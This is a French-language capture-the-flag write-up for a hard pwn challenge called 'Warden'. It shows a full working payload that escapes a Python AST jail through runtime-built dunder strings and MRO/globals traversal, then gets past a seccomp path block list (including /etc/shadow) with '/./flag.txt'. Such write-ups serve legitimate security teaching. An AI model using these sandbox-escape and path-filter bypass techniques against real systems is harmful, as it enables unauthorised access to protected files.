# Warden

- [🗞️ INFO](#️-info)
- [📝 Wording](#-wording)
- [🛠️ Tools](#️-tools)
- [🧠 Write Up](#-write-up)

## 🗞️ INFO

**Platform**: 0xFun

**Category**: Pwn

**Difficulty**: hard

**Link**: <https://ctf.0xfun.org/challenges>

## 📝 Wording

> The Warden watches every syscall. But who watches the Warden?

## 🛠️ Tools

- Python3

## 🧠 Write Up

Le challenge nous donne deux fichiers source : `jail.py` (un jail Python) et `warden.c` (un superviseur seccomp). Il y a donc **deux couches de sécurité** à bypass.

### Couche 1 : Le Python Jail

Le jail parse notre code en AST et bloque :

- Les `import` / `from ... import`
- Les attributs commençant par `_` (donc `__class__`, `__bases__`, etc.)
- Les string literals contenant `__`
- Les appels directs à `eval`, `exec`, `open`, `__import__`, etc.

Le code tourne ensuite dans un namespace restreint avec un `__builtins__` custom qui ne contient que des fonctions "safe" comme `print`, `len`, `getattr`, `chr`, etc.

### Couche 2 : Le Warden seccomp

Le warden intercepte les syscalls via **seccomp user notification** et bloque notamment `openat`/`open` sur certains chemins avec un prefix match :

```c
static const char *BLOCKED_PATHS[] = {
    "/flag", "/root", "/etc/shadow", "/proc/self/mem", ...
};
if (strncmp(path, BLOCKED_PATHS[i], strlen(BLOCKED_PATHS[i])) == 0)
    return 1;
```

Il bloque aussi `execve` (après le premier appel), le networking, `ptrace`, `prctl`, etc.

### Bypass du jail : construction dynamique de strings

Le jail bloque `_` dans les attributs et `__` dans les littéraux **au niveau de l'AST**, mais `chr()` et `getattr()` sont dans les builtins. On peut donc construire les strings interdites **à runtime** :

```python
u = chr(95)          # u = "_"
uu = u + u           # uu = "__"
```

L'AST ne voit que `chr(95)` et une concaténation, pas de violation. Mais à l'exécution ça donne bien `"__"`.

### Bypass du jail : remontée MRO

On remonte la chaîne d'héritage Python pour accéder aux modules chargés en mémoire :

```python
obj = getattr(getattr((), uu + "class" + uu), uu + "bases" + uu)[0]
# () → tuple → __class__ → __bases__ → (object,) → object
subs = getattr(obj, uu + "subclasses" + uu)()
# object.__subclasses__() → [201 classes chargées en mémoire]
```

Parmi ces sous-classes, certaines ont été définies dans des modules qui importent `os`. En accédant à `SomeClass.__init__.__globals__`, on récupère le namespace du module et donc le module `os` :
```python
g = getattr(getattr(subs[145], uu + "init" + uu), uu + "globals" + uu)
o = g["os"]
```

### Recon du filesystem

Avec `os` en main, on fait un `os.listdir("/")` et `os.stat()` pour trouver le flag :
```
=== Root dir ===
  .dockerenv  bin  boot  dev  etc  flag.txt  home  ...
=== Looking for flag ===
  /flag: [Errno 2] No such file or directory
  EXISTS: /flag.txt size=42
```

Le flag est à **`/flag.txt`**, pas `/flag`.

### Bypass du warden : path traversal

Le warden fait `strncmp(path, "/flag", 5)` donc `/flag.txt` est bloqué (les 5 premiers chars matchent `/flag`). Mais le check se fait sur la **string brute**, pas sur le chemin résolu par le kernel.

| Chemin envoyé | Warden voit les 5 premiers chars | Match `/flag` ? | Kernel résout vers |
| ------------- | -------------------------------- | --------------- | ------------------ |
| `/flag.txt`   | `/flag`                          | ✅ → BLOQUÉ     | —                  |
| `/./flag.txt` | `/./fl`                          | ❌ → PASS       | `/flag.txt` ✅     |

C'est une vuln **TOCTOU** (Time-of-Check vs Time-of-Use) : le warden vérifie une représentation du chemin, mais le kernel en résout une autre.

### Exploit final

```python
u = chr(95)
uu = u + u

obj = getattr(getattr((), uu + "class" + uu), uu + "bases" + uu)[0]
subs = getattr(obj, uu + "subclasses" + uu)()

g = getattr(getattr(subs[145], uu + "init" + uu), uu + "globals" + uu)
o = g["os"]

fd = o.open("/./flag.txt", 0)
data = o.read(fd, 4096)
o.close(fd)
print(data.decode() if isinstance(data, bytes) else data)
```

On envoie ça via un script Python qui se connecte au serveur, envoie le payload et ferme le côté écriture (simule Ctrl+D) :

```txt
[*] Code accepted. Executing...
FLAG via /./flag.txt: 0xfun{wh0_w4tch3s_th3_w4rd3n_t0ctou_r4c3}
```

**Flag**: *0xfun{wh0_w4tch3s_th3_w4rd3n_t0ctou_r4c3}*
